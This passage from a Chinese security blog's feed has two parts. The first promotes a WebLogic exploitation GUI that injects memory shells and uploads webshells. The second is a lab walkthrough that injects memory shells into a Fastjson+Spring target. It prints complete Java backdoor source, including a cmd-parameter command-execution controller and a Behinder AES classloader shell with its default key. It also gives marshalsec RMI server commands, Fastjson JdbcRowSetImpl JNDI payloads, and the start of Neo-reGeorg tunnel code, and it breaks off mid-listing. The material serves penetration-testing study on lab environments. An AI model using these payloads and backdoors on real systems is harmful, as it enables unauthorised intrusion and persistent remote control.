    <content type="html"><![CDATA[<h1 id="WeblogicExploit-GUI-by-sp4z"><a href="#WeblogicExploit-GUI-by-sp4z" class="headerlink" title="WeblogicExploit-GUI by sp4z"></a>WeblogicExploit-GUI by sp4z</h1><p><a href="https://github.com/sp4zcmd/WeblogicExploit-GUI">https://github.com/sp4zcmd/WeblogicExploit-GUI</a></p><p>支持利用漏洞类型：</p><ul><li>CVE-2020-2551</li><li>CVE-2020-2555</li><li>CVE-2020-2883</li><li>CVE-2016-3510</li><li>CVE-2016-0638</li><li>CVE-2017-10271</li><li>Jdk7u21</li><li>CVE-2017-3248（JRMP）</li><li>CVE-2018-2628（JRMP）</li><li>CVE-2018-2893（JRMP）</li><li>CVE-2018-3245（JRMP）</li><li>CVE-2018-3181（JNDI）</li><li>CVE-2020-14882未授权访问+CVE-2021-2109（JNDI）</li></ul><p><img src="https://s1.ax1x.com/2022/04/20/LsuXDA.png" alt="LsuXDA.png"></p><h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者不承担任何法律及连带责任。</p><h1 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h1><p>原理：利用反序列化链式执行注入内存马代码，目前可以注入蚁剑CustomFilter和冰蝎Servlet</p><p>利用vulfocus环境测试</p><p>注入冰蝎内存马</p><p><img src="https://s1.ax1x.com/2022/04/20/LsKS4f.gif" alt="LsKS4f.gif"></p><p>注入蚁剑内存马</p><p><img src="https://s1.ax1x.com/2022/04/20/LsuzUP.gif" alt="LsuzUP.gif"></p><h1 id="一键上传webshell"><a href="#一键上传webshell" class="headerlink" title="一键上传webshell"></a>一键上传webshell</h1><p>原理：利用反序列化链式执行代码，自动遍历目录并上传文件，目前可以上传哥斯拉和冰蝎马。</p><p>利用vulfocus环境测试</p><p>写入哥斯拉</p><p><img src="https://s1.ax1x.com/2022/04/20/LsujHI.gif" alt="LsujHI.gif"></p><p>写入冰蝎</p><p><img src="https://s1.ax1x.com/2022/04/20/LsuxEt.gif" alt="LsuxEt.gif"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>原理：</p><ol><li>T3和IIOP类型漏洞通过绑定RMI实例实现命令执行</li><li>XMLDecoder类型漏洞通过从线程中获取response来进行回显</li></ol><h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><p>在VPS上启动JRMP服务，然后填入ip和端口即可</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>填入jndi注入的url，如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ldap:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span>/object<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson+Spring环境注入冰蝎和Neo-regeorg内存马</title>
    <link href="/2022/01/24/Fastjson-Spring%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%92%8CNeo-regeorg%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2022/01/24/Fastjson-Spring%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%92%8CNeo-regeorg%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>使用这个java漏洞靶场进行测试</p><p><a href="https://github.com/tangxiaofeng7/SecExample">https://github.com/tangxiaofeng7/SecExample</a></p><p>漏洞代码</p><p><a href="https://imgtu.com/i/7omoOe"><img src="https://s4.ax1x.com/2022/01/24/7omoOe.png" alt="7omoOe.png"></a></p><h1 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h1><p>用idea编译好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mem</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Mem</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = Mem.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/memshell&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        Mem injectToController = <span class="hljs-keyword">new</span> Mem(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mem</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            String arg0 = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            PrintWriter writer = response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-keyword">null</span>) &#123;<br>                String o = <span class="hljs-string">&quot;&quot;</span>;<br>                java.lang.ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.Scanner c = <span class="hljs-keyword">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span><br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>    &#125;<br><br><br></code></pre></td></tr></table></figure><p>进入项目下的target\classes文件夹，开启web服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7omwWV"><img src="https://s4.ax1x.com/2022/01/24/7omwWV.png" alt="7omwWV.png"></a></p><p>开启rmi</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#Mem&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7omDQU"><img src="https://s4.ax1x.com/2022/01/24/7omDQU.png" alt="7omDQU.png"></a></p><p>利用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/Mem&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7omsL4"><img src="https://s4.ax1x.com/2022/01/24/7omsL4.png" alt="7omsL4.png"></a></p><p>成功注入</p><p><a href="https://imgtu.com/i/7om0zT"><img src="https://s4.ax1x.com/2022/01/24/7om0zT.png" alt="7om0zT.png"></a></p><h1 id="注入冰蝎"><a href="#注入冰蝎" class="headerlink" title="注入冰蝎"></a>注入冰蝎</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>只需要在test方法里实现冰蝎jsp马的功能就可以</p><p>直接把jsp代码复制到test方法中，发现报了两个错误，缺少session对象和pageContext对象。我们可以直接从已有的request对象中获取session对象，加上一段即可<code>HttpSession session=request.getSession();</code>。pageContext是jsp内置对象，在spring中不存在</p><p><a href="https://imgtu.com/i/7omcw9"><img src="https://s4.ax1x.com/2022/01/24/7omcw9.png" alt="7omcw9.png"></a></p><p>先了解一下冰蝎jsp马的原理：</p><ol><li>服务端接收客户端发送的加密后的字节码数据，进行Base64+AES解码</li><li>得到对应的Payload的类后，用自定义的ClassLoader（U）加载字节码，进行<code>newInstance</code>实例化</li><li>调用Payload类的<code>equals</code>方法，并且传入<code>pageContext</code>作为参数（pageContext用于获取response对象以便在页面上输出执行的结果）</li></ol><p><a href="https://imgtu.com/i/7om6eJ"><img src="https://s4.ax1x.com/2022/01/24/7om6eJ.png" alt="7om6eJ.png"></a></p><p>查看冰蝎11客户端的源码</p><p>左边有一堆的Payload类，分别对应不同功能，是发送到服务端让目标机器执行的。先以BasicInfo这个获取基本信息的payload类为例，了解其工作流程，别的类也大同小异。</p><p>通过对jsp文件的分析，可知equals方法是所有payload类的入口，先从equals方法看起。发现调用了<code>fillContext</code>方法，注意这里没有限制equals方法的参数类型必须为pageContext</p><p><a href="https://imgtu.com/i/7omgoR"><img src="https://s4.ax1x.com/2022/01/24/7omgoR.png" alt="7omgoR.png"></a></p><p>再查看<code>fillContext</code>方法，发现在没有PageContext的情况下，只需要传入一个包含session，response、request的<code>Map&lt;String,Object&gt;</code>对象就可以了，这个我们可以自己构造出来</p><p><a href="https://imgtu.com/i/7omryF"><img src="https://s4.ax1x.com/2022/01/24/7omryF.png" alt="7omryF.png"></a></p><p>修改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MemBehinder</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MemBehinder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = MemBehinder.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/memshell&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        MemBehinder injectToController = <span class="hljs-keyword">new</span> MemBehinder(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MemBehinder</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        HttpSession session=request.getSession();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>                U(ClassLoader c)<br>                &#123;<br>                    <span class="hljs-keyword">super</span>(c);<br>                &#125;<br>                <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> []b)</span></span><br><span class="hljs-function">                </span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);<br>                &#125;<br>            &#125;<br><br>            String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br>            session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);<br>            Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> SecretKeySpec(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<br><br>            Map&lt;String,Object&gt; obj=<span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>            obj.put(<span class="hljs-string">&quot;session&quot;</span>,session);<br>            obj.put(<span class="hljs-string">&quot;response&quot;</span>,response);<br>            obj.put(<span class="hljs-string">&quot;request&quot;</span>,request);<br><br>            <span class="hljs-keyword">new</span> U(<span class="hljs-keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(obj);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>进入项目下的target\classes文件夹，开启web服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>开启rmi</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#MemBehinder&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>利用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/MemBehinder&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/7omRF1"><img src="https://s4.ax1x.com/2022/01/24/7omRF1.png" alt="7omRF1.png"></a></p><p>访问页面</p><p><a href="https://imgtu.com/i/7om4SK"><img src="https://s4.ax1x.com/2022/01/24/7om4SK.png" alt="7om4SK.png"></a></p><p>连接成功</p><p><a href="https://imgtu.com/i/7omfW6"><img src="https://s4.ax1x.com/2022/01/24/7omfW6.png" alt="7omfW6.png"></a></p><p><a href="https://imgtu.com/i/7omWJx"><img src="https://s4.ax1x.com/2022/01/24/7omWJx.png" alt="7omWJx.png"></a></p><h1 id="注入Neo-reGeorg"><a href="#注入Neo-reGeorg" class="headerlink" title="注入Neo-reGeorg"></a>注入Neo-reGeorg</h1><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>用Neo-regeorg生成jsp文件，然后把代码复制过来就行，密码用的是pass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 